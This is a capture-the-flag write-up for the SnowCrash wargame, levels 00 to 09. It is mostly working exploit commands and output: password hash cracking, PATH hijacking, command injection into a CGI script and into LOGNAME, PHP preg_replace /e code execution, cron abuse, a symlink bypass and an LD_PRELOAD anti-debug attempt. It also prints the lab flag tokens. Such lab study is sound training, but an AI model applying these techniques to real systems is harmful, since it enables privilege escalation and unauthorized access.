# Snowcrash

## Level00

- Find the hidden 'john' file

```bash
level00@SnowCrash:~$ find / -user flag00 2> /dev/null
/usr/sbin/john
/rofs/usr/sbin/john
```

```bash
level00@SnowCrash:~$ cat /usr/sbin/john 
cdiiddwpgswtgt
```

- Decrypt it

https://www.dcode.fr/caesar-cipher

Caesar cipher +15: `nottoohardhere`

- Change user to `flag01` & `level01`

```bash
su flag00
<<< 'nottoohardhere'
```
```bash
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias

flag00@SnowCrash:~$ su level01
<<< x24ti5gi3x0ol2eh4esiuxias

flag01@SnowCrash:~$
```

## Level01

- /etc/passwd contains a passwd not in the /etc/shadow file (not marked with an 'x')

```
> cat /etc/passwd
level13:x:2013:2013::/home/user/level13:/bin/bash
level14:x:2014:2014::/home/user/level14:/bin/bash
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
flag04:x:3004:3004::/home/flag/flag04:/bin/bash
...
```

- Documentation of the unix salt passwd implementation

https://www.oreilly.com/library/view/practical-unix-and/0596003234/ch04s03.html

https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/

### Cracking the /etc/passwd entry

- Fire up a virtual machine to install John The ripper

[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://ssh.cloud.google.com/cloudshell/editor?cloudshell_git_repo=http://path-to-repo/sample.git)

```bash
sudo apt-get update
sudo apt-get install -y john
```

- Copy the passwd entry in a file

```bash
echo "flag01:42hDRfypTqqnw" > passwd

user@cloudshell:~$ john passwd
Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 SSE2-16])
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefg          (flag01)
1g 0:00:00:00 100% 2/3 14.28g/s 19900p/s 19900c/s 19900C/s raquel..bigman 
Use the "--show" option to display all of the cracked passwords reliably
Session completed         
```

### Login to level02

```bash
su flag01 <<< 'abcdef'

flag01> getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf

su level02 <<< 'f2av5il02puano7naaf6adaaf'
```

## Level02

### Find pcap file

```bash
level02@SnowCrash:~$ ls
level02.pcap
```

### Analyse pcap file

https://packettotal.com/app/analysis?id=cf308a96d1fed07984010db2e5cf8f31

https://serverfault.com/questions/38626/how-can-i-read-pcap-files-in-a-friendly-format/38632

https://stackoverflow.com/questions/13160309/conversion-hex-string-into-ascii-in-bash-command-line

```bash
tcpdump -qns 0 -A -r level02.pcap
```

### Filter only data from tcp packets

- Create a file with data from tcp frames

```bash
tshark -r level02.pcap -T fields -e data > data
```

- Convert hex to printable chars

```bash
cat data  | tr -d '\n' | xxd -r -p

%%& #'$& #'$ #' 38400,38400#SodaCan:0'DISPLAYSodaCan:0xterm"!""bb       B

1!""!"""


Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

wwwbugs login: lleevveellXX
Password: ft_wandrNDRelL0L

Login incorrect
wwwbugs login: 
```

### Filtering the password

- Strange characters appears when showing non-printable characters around the `Password` area

```bash
cat data  | tr -d '\n' | cut -c701- | xxd -r -p | cat -e
 (pts/10)^M$
$
^A^@wwwbugs login: l^@le^@ev^@ve^@el^@lX^@X^M^A^@^M$
Password: ft_wandr^?^?^?NDRel^?L0L^M^@^M$
^A^@^M$
Login incorrect^M$
```

- The non-printable chars appears to be `DEL` characters

https://www.asciitable.com/

```bash
cat data  | tr -d '\n' | cut -c825-900 | xxd -r -p | cat -e                                                                              
ft_wandr^?^?^?NDRel^?L0L^M^@^M$
^A^@^M$
Login inco
```

- Take raw hex output of the password:

```bash
cat data  | tr -d '\n' | cut -c825-868
66745f77616e64727f7f7f4e4452656c7f4c304c0d00
```

- Remove characters after DEL characters until the cariage return

https://www.rapidtables.com/convert/number/hex-to-ascii.html

we get `66745f77614e4452654c304c` / `ft_waNDReL0L`

### Su to next level

```bash
level02@SnowCrash:~$ su flag02
Password:
<<< 'ft_waNDReL0L'
Don\'t forget to launch getflag !

flag02@SnowCrash:~$ getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq

flag02@SnowCrash:~$ su level03
Password:
<<< 'kooda2puivaav1idi4f57q8iq'

level03@SnowCrash:~$
```

## Level03

After switching to the level03 user, we are greeted by an executable file with special permissions, owned by flag03

```bash
level03@SnowCrash:~$ ls -la
total 24
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```

The fact that it's an executable with special permissions made me think I should take control of the program to execute the `getflag` command

### Exploiting the binary

```bash
level03@SnowCrash:~$ ./level03
Exploit me
```

- Filtering [strings](http://ix.io/27EI) from the program shows the program is using the echo binary in it's environment with [system(3)](http://man7.org/linux/man-pages/man3/system.3.html) to print the message instead of using write(2)

```bash
level03@SnowCrash:~$ strings level03
/lib/ld-linux.so.2
KT{K
...
system
getegid
geteuid
__libc_start_main
...
[^_]
/usr/bin/env echo Exploit me
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/home/user/level03
/usr/include/i386-linux-gnu/bits
/usr/include/i386-linux-gnu/sys
level03.c
types.h
...
/home/user/level03/level03.c
...

```

- We can use a different echo command

```bash
level03@SnowCrash:~$ which getflag
/bin/getflag

level03@SnowCrash:~$ mkdir test
mkdir: cannot create directory `test': Permission denied

level03@SnowCrash:~$ mktemp -d
/tmp/tmp.yJuq6aWVv2
level03@SnowCrash:~$ cp /bin/getflag /tmp/tmp.yJuq6aWVv2/echo
level03@SnowCrash:~$ chmod -R 777 /tmp/tmp.yJuq6aWVv2
```

- Then execute our new `echo` binary by modifing the `PATH` variable in the environment

```bash
level03@SnowCrash:~$ PATH=/tmp/tmp.yJuq6aWVv2 ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

### Go to level04

```bash
su level04
Password:
<<< 'qi0maab88jeaj46qoumi7maus'

level04@SnowCrash:~$
```

## Level04

```bash
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

```perl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

```bash
level04@SnowCrash:~$ ./level04.pl
Content-type: text/html
```

### Finding the server

- A quick search to know how this CGI stuff works...

https://www.cs.ait.ac.th/~on/O/oreilly/perl/learn32/ch18_04.htm

- Find the server behind this

```bash
level04@SnowCrash:~$ netstat -plnt
(No info could be read for "-p": geteuid()=2004 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4646                 :::*                    LISTEN      -
tcp6       0      0 :::4747                 :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
```

```html
level04@SnowCrash:~$ curl  localhost:4646/level04.pl?x=test
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /level04.pl was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 4646</address>
</body></html>
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x=test
test
```

```html
level04@SnowCrash:~$ curl  localhost:80/level04.pl?x=test
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /level04.pl was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at localhost Port 80</address>
</body></html>
```

```bash
level04@SnowCrash:~$ curl  localhost:4242/level04.pl?x=test
SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.7
Protocol mismatch.
curl: (56) Recv failure: Connection reset by peer
```

### Then exploiting it

- Some documentation .... 

https://www.tutorialspoint.com/perl/perl_subroutines.htm

https://stackoverflow.com/questions/3589837/what-is-the-significance-of-an-underscore-in-perl

https://www.stat.berkeley.edu/~spector/extension/perl/notes/node73.html

https://alvinalexander.com/perl/edu/articles/pl010003.shtml

After testing some things, something made me think we're executing a shell

```bash
level04@SnowCrash:~$ curl localhost:4747/level04.pl?x='$$'
6260
```

As the code only executes the 1st parameter, I had to find a way to run `getflag` in the same command of `echo`

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls | echo '
ls
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls|whoami'
flag04
```

```bash
level04@SnowCrash:~$ curl  localhost:4747/level04.pl?x='ls|getflag'

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

### Go to level05

```bash
su level05
Password:
<<< 'ne2searoevaevoem4ov4ar8ap'

level05@SnowCrash:~$
```

## Level 05

```bash
level05@10.11.200.163's password:
You have new mail.
level05@SnowCrash:~$
```

When switching to user level05, we are greeted by a notification saying we received a mail

```bash
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Inspecting the mail file gives us a cronjob running every 2 minutes, executing a binary located in `/usr/sbin`

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

When inspecting the executed file, we can see it executes the content of every file located in `/opt/openarenaserver/` in a new `bash` shell, then removes the file

### Exploit

The goal will be to make the cronjob execute `getflag`, with the content of the output in a new file for us to retrieve the flag

We can create a temporary file with `mktemp` and allow the cronjob to write to it with a `chmod`

```bash
level05@SnowCrash:~$ mktemp
/tmp/tmp.8ir7nD1H2g

level05@SnowCrash:~$ chmod 777 /tmp/tmp.8ir7nD1H2g
```

Then we create a new script file in `/opt/openarenaserver/` with the command we want the cronjob to execute, in our case, `getflag` redirected to our temporary file

```bash
level05@SnowCrash:~$ echo "getflag > /tmp/tmp.8ir7nD1H2g" > /opt/openarenaserver/exploit.sh

level05@SnowCrash:~$ chmod 777 /opt/openarenaserver/exploit.sh  
```

Wait some time . . .

```bash
level05@SnowCrash:~$ cat /tmp/tmp.8ir7nD1H2g
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

### Goto level 06

```bash
level05@SnowCrash:~$ su level06
Password:
<<< 'viuaaale9huek52boumoomioc'

level06@SnowCrash:~$
```

## Level 06

When logging in to level 06, we can find two files in our home directory, a php file and a binary with the same name, both owned by `flag06`

```bash
level06@SnowCrash:~$ ls -lA
total 24
-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
-r-x------  1 level06 level06  675 Apr  3  2012 .profile
```

```php
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

At the first look, we can see the php script takes 2 command-line arguments, opens a file with the 1st one, makes some regex replacements on the content of the file, but the 2nd variable is unused

After experimenting with the binary with various arguments, we can see we get the same output whether we use the binary file or the php script.

### Exploit

This was a tricky one and needed a lot of documentation, when looking for the usage of the `/e` regex modifier, I found it was deprecated since a long time and the version of php on the machine was outdated

- https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier
- https://stackoverflow.com/questions/19245205/replace-deprecated-preg-replace-e-with-preg-replace-callback

```bash
level06@SnowCrash:~$ php --version
PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54)
Copyright (c) 1997-2012 The PHP Group
Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
```

When learning about the vulnerabilites of this modifier, I found some examples of exploitation of it:

- https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation
- http://www.madirish.net/402
- https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
- https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection

To exploit it we firstly needed a text file which would be read by the binary, saved in the `$a` variable

```bash
level06@SnowCrash:~$ mktemp
/tmp/tmp.kiGPcYouaI

level06@SnowCrash:~$ chmod 777 /tmp/tmp.kiGPcYouaI
```

After some documentation about how to execute functions stocked in strings in php

- https://www.php.net/manual/fr/language.types.string.php

```bash
level06@SnowCrash:~$ echo '[x {${shell_exec($z)}}}]' > /tmp/tmp.kiGPcYouaI.1
level06@SnowCrash:~$ echo 'getflag' > /tmp/tmp.kiGPcYouaI.2

level06@SnowCrash:~$ ./level06 /tmp/tmp.kiGPcYouaI.1 $(cat /tmp/tmp.kiGPcp/tmp.kiGPcYouaI.2)
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
}
```

## Level07

When logging in to level07, a level07 binary can be found in the home directory

```bash
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

When running the binary into `ltrace`, we can see the binary is using `system(3)`, which can be easily exploitable, and a `getenv()` call on the `LOGNAME` variable

```bash
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7c4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                                     = 2007
geteuid()                                                                                                     = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                           = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                           = 0
getenv("LOGNAME")                                                                                             = "level07"
asprintf(0xbffff714, 0x8048688, 0xbfffff4c, 0xb7e5ee55, 0xb7fed280)                                           = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                        = 0
+++ exited (status 0) +++
```

When trying to modify the content of the `LOGNAME` variable, we can see the program also changes it's output, we know the program is running `/bin/echo` on `LOGNAME`.

At this point, we can easily guess how to run the `getflag` command in the `system(3)` call

```bash
level07@SnowCrash:~$ env LOGNAME=';getflag' ./level07

Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Level08

```bash
level08@SnowCrash:~$ ls -lA
total 28
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]

level08@SnowCrash:~$ ./level08 ./token
You may not access './token'

level08@SnowCrash:~$ ltrace ./level08 ./token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("./token", "token")                                                                                                = "token"
printf("You may not access '%s'\n", "./token"You may not access './token'
)                                                                            = 29
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$
```

```bash
level08@SnowCrash:~$ pwd
/home/user/level08

level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/lolol

level08@SnowCrash:~$ ls -la /tmp/lolol
lrwxrwxrwx 1 level08 level08 24 Jan 27 19:18 /tmp/lolol -> /home/user/level08/token

level08@SnowCrash:~$ ./level08 /tmp/lolol
quif5eloekouj29ke0vouxean
```

```bash
❯ ssh flag08@10.12.1.143 -p 4242
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.12.1.143

flag08@10.12.1.143's password:
Don't forget to launch getflag !

flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Level09

```bash
level09@SnowCrash:~$ ls -lA
total 24
-r-x------ 1 level09 level09  220 Apr  3  2012 .bash_logout
-r-x------ 1 level09 level09 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag09  level09 7640 Mar  5  2016 level09
-r-x------ 1 level09 level09  675 Apr  3  2012 .profile
----r--r-- 1 flag09  level09   26 Mar  5  2016 token
```

When running with ltrace, a different message appears

```bash
level09@SnowCrash:~$ ./level09
You need to provied only one arg.
level09@SnowCrash:~$ ltrace  ./level09
__libc_start_main(0x80487ce, 1, 0xbffff7f4, 0x8048aa0, 0x8048b10 <unfinished ...>
ptrace(0, 0, 1, 0, 0xb7e2fe38)                                                                                            = -1
puts("You should not reverse this"You should not reverse this
)                                                                                       = 28
+++ exited (status 1) +++
level09@SnowCrash:~$
```

Same thing with strace ....

```bash
level09@SnowCrash:~$ ./
.bash_logout  .bashrc       level09       .profile
level09@SnowCrash:~$ ./level09 ./token
.0vrojt
level09@SnowCrash:~$ strace ./level09 ./token
execve("./level09", ["./level09", "./token"], [/* 18 vars */]) = 0
brk(0)                                  = 0x804b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0
mmap2(NULL, 1739484, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e2c000
mmap2(0xb7fcf000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a3) = 0xb7fcf000
mmap2(0xb7fd2000, 10972, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fd2000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e2b000
set_thread_area({entry_number:-1 -> 6, base_addr:0xb7e2b900, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xb7fcf000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xb7ffe000, 4096, PROT_READ)   = 0
munmap(0xb7fd5000, 21440)               = 0
ptrace(PTRACE_TRACEME, 0, 0x1, 0)       = -1 EPERM (Operation not permitted)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 3), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fda000
write(1, "You should not reverse this\n", 28You should not reverse this
) = 28
exit_group(1)                           = ?
level09@SnowCrash:~$
```

Documentation about ptrace(2), -> Google related result `ptrace anti debug`

The binary is doing the somewhat famous in the reverse engineering community 'ptrace anti-debug' trick

- https://aaronyoo.github.io/ptrace-anti-debug.html

```text
For the ptrace anti-debug mechanism, the program tries to call ptrace on itself.
This will fail if the program is being debugged and will succeed if the program is not being debugged because no two tracers can trace the same tracee. 
```

This explains why we get the following line in our strace() output !

```bash
ptrace(PTRACE_TRACEME, 0, 0x1, 0)       = -1 EPERM (Operation not permitted)
```

### Exploiting the binary

```bash
level09@SnowCrash:~$ mktemp  -d
/tmp/tmp.98mqTFCvW9

level09@SnowCrash:~$ cd /tmp/tmp.98mqTFCvW9
```

```bash
nano inject.c
long ptrace(int a, int b, void *c, void *d) {
        return 0; // Redefine ptrace()
}
```

```bash
level09@SnowCrash:/tmp/tmp.98mqTFCvW9$ gcc -shared -fPIC -o ptrace_inject.so inject.c

level09@SnowCrash:/tmp/tmp.98mqTFCvW9$ ltrace env LD_PRELOAD=./ptrace_inject.so /home/user/level09/level09 /home/user/level09/token
__libc_start_main(0x8048db0, 4, 0xbffff794, 0x804b700, 0x804b770 <unfinished ...>
strrchr("env", '/')                                                                                                       = NULL
setlocale(6, "")                                                                                                          = "en_US.UTF-8"
bindtextdomain("coreutils", "/usr/share/locale")                                                                          = "/usr/share/locale"
textdomain("coreutils")                                                                                                   = "coreutils"
__cxa_atexit(0x8049500, 0, 0, 0xbffff794, 4)                                                                              = 0
getopt_long(4, 0xbffff794, "+iu:0", 0x0804bc40, NULL)                                                                     = -1
getopt_long(4, 0xbffff794, "+iu:0", 0x0804bc40, NULL)                                                                     = -1
strchr("LD_PRELOAD=./ptrace_inject.so", '=')                                                                              = "=./ptrace_inject.so"
putenv("LD_PRELOAD=./ptrace_inject.so")                                                                                   = 0
strchr("/home/user/level09/level09", '=')                                                                                 = NULL
execvp(0xbffff8d9, 0xbffff79c, 0x804bbea, 0x804bc40, 0 <unfinished ...>
--- Called exec() ---
__libc_start_main(0x80487ce, 2, 0xbffff784, 0x8048aa0, 0x8048b10 <unfinished ...>
ptrace(0, 0, 1, 0, 0xb7e2ce38)                                                                                            = 0
getenv("LD_PRELOAD")                                                                                                      = "./ptrace_inject.so"
fwrite("Injection Linked lib detected ex"..., 1, 37, 0xb7fce980Injection Linked lib detected exit..
)                                                          = 37
+++ exited (status 1) +++
level09@SnowCrash:/tmp/tmp.98mqTFCvW9$
```

Looks like the binary is not that idiot...

